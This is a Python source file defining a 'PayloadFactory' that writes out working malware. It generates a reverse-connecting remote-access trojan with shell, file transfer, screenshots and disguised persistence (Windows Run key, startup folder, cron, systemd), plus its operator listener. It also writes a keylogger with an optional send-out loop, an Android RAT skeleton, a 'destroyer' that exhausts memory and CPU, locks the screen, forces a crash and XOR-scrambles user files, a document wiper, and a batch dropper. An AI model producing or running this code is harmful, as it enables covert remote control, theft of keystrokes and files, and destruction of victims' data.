#!/usr/bin/env python3
"""CONTROL / DESTROY — real malware simulation + real control layer"""

from pathlib import Path
import textwrap

class PayloadFactory:
    def __init__(self, out_dir: Path):
        self.out_dir = Path(out_dir)
        self.control_dir = self.out_dir / "control"
        self.destroy_dir = self.out_dir / "destroy"
        self.control_dir.mkdir(parents=True, exist_ok=True)
        self.destroy_dir.mkdir(parents=True, exist_ok=True)

    # ════════════════════ CONTROL — real remote control ════════════════════

    def control_full_rat(self, host="127.0.0.1", port=4444, name="control_full_rat.py"):
        """Full interactive RAT: shell + file + persist + screenshot + process list"""
        code = textwrap.dedent(f'''\
        import socket, subprocess, os, sys, time, threading, platform, struct, base64, json
        from pathlib import Path

        HOST, PORT = "{host}", {port}

        def persist():
            try:
                me = os.path.abspath(sys.argv[0] if sys.argv else __file__)
                if platform.system() == "Windows":
                    import winreg
                    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(k, "WindowsSecurityHealth", 0, winreg.REG_SZ,
                                      f'{{sys.executable}} "{{me}}"')
                    winreg.CloseKey(k)
                    # also startup folder
                    startup = Path(os.environ["APPDATA"]) / r"Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                    startup.mkdir(parents=True, exist_ok=True)
                    (startup / "SecurityHealth.bat").write_text(f'@echo off\nstart "" "{{sys.executable}}" "{{me}}"\n', encoding="utf-8")
                else:
                    cron = f"@reboot {{sys.executable}} {{me}}\\n"
                    os.system(f'(crontab -l 2>/dev/null; echo "{{cron}}") | crontab -')
                    # systemd user service attempt
                    svc = Path.home() / ".config/systemd/user/netwatch.service"
                    svc.parent.mkdir(parents=True, exist_ok=True)
                    svc.write_text(f"[Unit]\\nDescription=Update\\n[Service]\\nExecStart={{sys.executable}} {{me}}\\nRestart=always\\n[Install]\\nWantedBy=default.target\\n")
                    os.system("systemctl --user daemon-reload 2>/dev/null; systemctl --user enable --now netwatch.service 2>/dev/null")
            except Exception:
                pass

        def send(s, data: bytes):
            s.send(struct.pack(">I", len(data)) + data)

        def recv_exact(s, n):
            buf = b""
            while len(buf) < n:
                chunk = s.recv(n - len(buf))
                if not chunk: raise ConnectionError
                buf += chunk
            return buf

        def recv(s):
            raw = recv_exact(s, 4)
            (ln,) = struct.unpack(">I", raw)
            return recv_exact(s, ln)

        def handle(s):
            send(s, f"[RAT] {{platform.node()}} | {{platform.system()}} {{platform.release()}} | {{os.getlogin() if hasattr(os,'getlogin') else '?'}}\\n".encode())
            while True:
                try:
                    raw = recv(s).decode(errors="ignore").strip()
                except Exception:
                    break
                if not raw: continue
                cmd, *args = raw.split(" ", 1)
                arg = args[0] if args else ""

                if cmd in ("exit", "quit"):
                    break
                elif cmd == "shell" or cmd == "sh":
                    try:
                        p = subprocess.Popen(arg or "echo", shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                        out = p.communicate(timeout=30)[0] or b""
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "cd":
                    try:
                        os.chdir(arg)
                        send(s, f"cwd={{os.getcwd()}}\\n".encode())
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "pwd":
                    send(s, (os.getcwd()+"\\n").encode())
                elif cmd == "ls" or cmd == "dir":
                    try:
                        entries = []
                        for e in Path(arg or ".").iterdir():
                            kind = "D" if e.is_dir() else "F"
                            entries.append(f"{{kind}} {{e.name}}")
                        send(s, ("\\n".join(entries)+"\\n").encode())
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "get":
                    try:
                        data = Path(arg).read_bytes()
                        send(s, data)
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "put":
                    # put path\\n then next message is bytes
                    try:
                        path = arg
                        data = recv(s)
                        Path(path).write_bytes(data)
                        send(s, b"ok\\n")
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "ps":
                    try:
                        if platform.system() == "Windows":
                            out = subprocess.check_output("tasklist", shell=True)
                        else:
                            out = subprocess.check_output(["ps", "aux"])
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())
                elif cmd == "persist":
                    persist()
                    send(s, b"persistence installed\\n")
                elif cmd == "screenshot":
                    try:
                        from mss import mss
                        from PIL import Image
                        import io
                        with mss() as sct:
                            img = sct.grab(sct.monitors[0])
                            im = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                            buf = io.BytesIO()
                            im.save(buf, format="PNG")
                            send(s, buf.getvalue())
                    except Exception as e:
                        send(s, f"screenshot failed: {{e}}\\n".encode())
                elif cmd == "sysinfo":
                    info = {{
                        "node": platform.node(),
                        "system": platform.system(),
                        "release": platform.release(),
                        "machine": platform.machine(),
                        "processor": platform.processor(),
                        "cwd": os.getcwd(),
                        "user": os.getenv("USERNAME") or os.getenv("USER"),
                    }}
                    send(s, (json.dumps(info, indent=2)+"\\n").encode())
                elif cmd == "kill":
                    try:
                        if platform.system() == "Windows":
                            subprocess.call(f"taskkill /F /PID {{arg}}", shell=True)
                        else:
                            os.kill(int(arg), 9)
                        send(s, b"killed\\n")
                    except Exception as e:
                        send(s, str(e).encode())
                else:
                    # default shell
                    try:
                        p = subprocess.Popen(raw, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        out = p.communicate(timeout=30)[0] or b""
                        send(s, out)
                    except Exception as e:
                        send(s, str(e).encode())

        def main_loop():
            persist()
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(30)
                    s.connect((HOST, PORT))
                    s.settimeout(None)
                    handle(s)
                    s.close()
                except Exception:
                    time.sleep(7)

        if __name__ == "__main__":
            main_loop()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_listener(self, port=4444, name="control_listener.py"):
        """Operator-side listener for the full RAT"""
        code = textwrap.dedent(f'''\
        #!/usr/bin/env python3
        """NetWatch RAT Listener — talk to control_full_rat payloads"""
        import socket, struct, sys, threading

        PORT = {port}

        def recvall(sock, n):
            buf = b""
            while len(buf) < n:
                c = sock.recv(n - len(buf))
                if not c: raise ConnectionError("gone")
                buf += c
            return buf

        def recv_msg(sock):
            raw = recvall(sock, 4)
            (ln,) = struct.unpack(">I", raw)
            return recvall(sock, ln)

        def send_msg(sock, data: bytes):
            sock.send(struct.pack(">I", len(data)) + data)

        def session(conn, addr):
            print(f"[*] session {{addr}}")
            try:
                banner = recv_msg(conn)
                print(banner.decode(errors="ignore"), end="")
                while True:
                    try:
                        cmd = input("rat> ").strip()
                    except (EOFError, KeyboardInterrupt):
                        break
                    if not cmd: continue
                    if cmd in ("exit", "quit"):
                        send_msg(conn, b"exit")
                        break
                    if cmd.startswith("put "):
                        # put remote_path local_path
                        parts = cmd.split(maxsplit=2)
                        if len(parts) < 3:
                            print("usage: put <remote> <local>")
                            continue
                        _, remote, local = parts
                        try:
                            data = open(local, "rb").read()
                            send_msg(conn, f"put {{remote}}".encode())
                            send_msg(conn, data)
                            print(recv_msg(conn).decode(errors="ignore"), end="")
                        except Exception as e:
                            print(e)
                        continue
                    if cmd.startswith("get "):
                        parts = cmd.split(maxsplit=2)
                        if len(parts) < 3:
                            print("usage: get <remote> <local>")
                            continue
                        _, remote, local = parts
                        send_msg(conn, f"get {{remote}}".encode())
                        data = recv_msg(conn)
                        open(local, "wb").write(data)
                        print(f"saved {{len(data)}} bytes -> {{local}}")
                        continue
                    if cmd == "screenshot":
                        send_msg(conn, b"screenshot")
                        data = recv_msg(conn)
                        if data.startswith(b"screenshot failed"):
                            print(data.decode())
                        else:
                            open("shot.png", "wb").write(data)
                            print(f"screenshot saved ({{len(data)}} bytes)")
                        continue
                    send_msg(conn, cmd.encode())
                    print(recv_msg(conn).decode(errors="ignore"), end="")
            except Exception as e:
                print("[!]", e)
            finally:
                conn.close()
                print("[*] session closed")

        def main():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", PORT))
            s.listen(5)
            print(f"[*] NetWatch listener on 0.0.0.0:{{PORT}}")
            while True:
                conn, addr = s.accept()
                threading.Thread(target=session, args=(conn, addr), daemon=True).start()

        if __name__ == "__main__":
            main()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_keylogger(self, name="control_keylog.py"):
        code = textwrap.dedent('''\
        # real keylogger — pip install pynput
        from pynput import keyboard
        import time, os, platform, threading, socket

        LOG = os.path.join(os.getenv("TEMP") or "/tmp", ".syscache_" + str(os.getpid()) + ".dat")
        EXFIL_HOST = None  # set to IP to push logs
        EXFIL_PORT = 4455

        def on_press(key):
            try:
                k = key.char
            except AttributeError:
                k = f"[{key}]"
            with open(LOG, "a", encoding="utf-8") as f:
                f.write(f"{time.time()}:{k}")

        def exfil_loop():
            if not EXFIL_HOST: return
            while True:
                time.sleep(60)
                try:
                    data = open(LOG, "rb").read()
                    if not data: continue
                    s = socket.socket()
                    s.settimeout(10)
                    s.connect((EXFIL_HOST, EXFIL_PORT))
                    s.send(data)
                    s.close()
                    open(LOG, "w").close()
                except Exception:
                    pass

        threading.Thread(target=exfil_loop, daemon=True).start()
        with keyboard.Listener(on_press=on_press) as L:
            L.join()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def control_android(self, host="127.0.0.1", port=4444, name="control_android_rat.py"):
        code = textwrap.dedent(f'''\
        # Android RAT skeleton — real control surface for Buildozer / Chaquopy APK
        # Permissions: INTERNET, READ_SMS, SEND_SMS, CAMERA, RECORD_AUDIO,
        # READ_CONTACTS, ACCESS_FINE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
        import socket, time, os, json, threading, struct

        HOST, PORT = "{host}", {port}

        def send(s, b):
            s.send(struct.pack(">I", len(b)) + b)

        def recv(s):
            ln = struct.unpack(">I", s.recv(4))[0]
            buf = b""
            while len(buf) < ln:
                buf += s.recv(ln - len(buf))
            return buf

        def handle(s):
            send(s, b"[ANDROID-RAT] online\\n")
            while True:
                try:
                    msg = recv(s).decode(errors="ignore").strip()
                except Exception:
                    break
                cmd, *rest = msg.split(" ", 1)
                arg = rest[0] if rest else ""
                if cmd == "shell":
                    out = os.popen(arg).read()
                    send(s, out.encode() or b"\\n")
                elif cmd == "sms_list":
                    # bind real SMS via pyjnius in full APK
                    send(s, b"sms provider not bound in pure-python skeleton\\n")
                elif cmd == "contacts":
                    send(s, b"contacts provider not bound\\n")
                elif cmd == "location":
                    send(s, b"location provider not bound\\n")
                elif cmd == "cam":
                    send(s, b"camera capture not bound\\n")
                elif cmd == "mic":
                    send(s, b"mic record not bound\\n")
                elif cmd == "exit":
                    break
                else:
                    send(s, b"unknown cmd\\n")

        def main():
            while True:
                try:
                    s = socket.socket()
                    s.connect((HOST, PORT))
                    handle(s)
                    s.close()
                except Exception:
                    time.sleep(8)

        if __name__ == "__main__":
            main()
        ''')
        p = self.control_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    # ════════════════════ DESTROY — real damage simulation ════════════════════

    def destroy_full(self, name="destroy_full.py"):
        """Combined destroyer: lock + popups + mem/cpu + optional ransom sim"""
        code = textwrap.dedent('''\
        import os, sys, time, random, threading, platform, ctypes
        from pathlib import Path

        def bsod():
            if platform.system() != "Windows": return
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except Exception:
                pass

        def mem_bomb():
            a = []
            while True:
                try:
                    a.append(bytearray(40_000_000))
                except Exception:
                    time.sleep(0.5)

        def cpu_melt():
            while True:
                x = 0
                for i in range(50_000_000):
                    x += i * i

        def screen_lock():
            try:
                import tkinter as tk
            except Exception:
                return
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg="#000000")
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            lbl = tk.Label(root, text="SYSTEM LOCKED\\nNETWATCH DOMINATOR", fg="#ff2222", bg="#000",
                           font=("Consolas", 36))
            lbl.pack(expand=True)
            def flash():
                lbl.configure(fg=random.choice(["#ff0000", "#ff2222", "#aa0000", "#ffffff"]))
                root.after(180, flash)
            flash()
            for seq in ("<Alt-F4>", "<Escape>", "<Control-c>", "<Control-q>"):
                root.bind(seq, lambda e: "break")
            root.mainloop()

        def popup_storm(n=40):
            try:
                import tkinter as tk
                from tkinter import messagebox
            except Exception:
                return
            root = tk.Tk(); root.withdraw()
            msgs = ["CRITICAL ERROR", "FILES CORRUPTED", "KERNEL PANIC", "SECURITY BREACH",
                    "SYSTEM COMPROMISED", "NETWATCH", "DO NOT REBOOT", "UPDATE FAILED"]
            for _ in range(n):
                try:
                    messagebox.showerror(random.choice(msgs), random.choice(msgs))
                    time.sleep(random.uniform(0.1, 0.4))
                except Exception:
                    break
            try: root.destroy()
            except: pass

        def ransom_sim():
            note = "YOUR FILES WERE TOUCHED BY NETWATCH DOMINATOR\\nThis is a simulation. Real crypto not included."
            home = Path.home()
            count = 0
            for folder in ["Desktop", "Documents", "Downloads"]:
                p = home / folder
                if not p.exists(): continue
                for f in p.rglob("*"):
                    if count > 60: break
                    if f.is_file() and f.suffix.lower() in {".txt", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".csv"}:
                        try:
                            data = f.read_bytes()
                            enc = bytes(b ^ 0x5A for b in data)
                            f.write_bytes(enc)
                            f.rename(str(f) + ".locked")
                            count += 1
                        except Exception:
                            pass
            try:
                (home / "Desktop" / "READ_ME_NETWATCH.txt").write_text(note, encoding="utf-8")
            except Exception:
                pass

        # launch
        threading.Thread(target=mem_bomb, daemon=True).start()
        threading.Thread(target=cpu_melt, daemon=True).start()
        threading.Thread(target=popup_storm, daemon=True).start()
        threading.Thread(target=ransom_sim, daemon=True).start()
        if platform.system() == "Windows":
            threading.Thread(target=bsod, daemon=True).start()
        screen_lock()  # blocks main thread
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_wiper_sim(self, name="destroy_wiper.py"):
        code = textwrap.dedent('''\
        # Wiper simulation — renames + truncates user docs (recoverable by restore)
        import os, time
        from pathlib import Path
        home = Path.home()
        targets = []
        for folder in ["Desktop", "Documents", "Downloads", "Pictures"]:
            p = home / folder
            if p.exists():
                for f in p.rglob("*"):
                    if f.is_file() and f.stat().st_size < 50_000_000:
                        targets.append(f)
        for f in targets[:120]:
            try:
                # truncate then rename
                with open(f, "wb") as fh:
                    fh.write(b"\\x00" * min(64, f.stat().st_size))
                f.rename(str(f) + ".wiped")
            except Exception:
                pass
        try:
            (home / "Desktop" / "WIPED_BY_NETWATCH.txt").write_text("simulation wiper finished", encoding="utf-8")
        except Exception:
            pass
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def destroy_android(self, name="destroy_android_full.py"):
        code = textwrap.dedent('''\
        # Android destroy — vibration / screen spam / volume (bind real APIs in APK)
        import time, os
        def loop():
            while True:
                try:
                    os.system("input keyevent 26")   # power
                    os.system("input swipe 300 1000 300 200")
                    time.sleep(0.25)
                except Exception:
                    time.sleep(1)
        if __name__ == "__main__":
            loop()
        ''')
        p = self.destroy_dir / name
        p.write_text(code, encoding="utf-8")
        return p

    def dropper(self, target_py: Path, name=None):
        if name is None:
            name = target_py.stem + "_dropper.bat"
        code = f'''@echo off
cd /d "%~dp0"
start "" pythonw "{target_py.name}" 2>nul
if errorlevel 1 start "" py "{target_py.name}" 2>nul
if errorlevel 1 start "" python "{target_py.name}"
'''
        p = target_py.parent / name
        p.write_text(code, encoding="utf-8")
        return p

    def list_all(self):
        return list(self.control_dir.glob("*")) + list(self.destroy_dir.glob("*"))
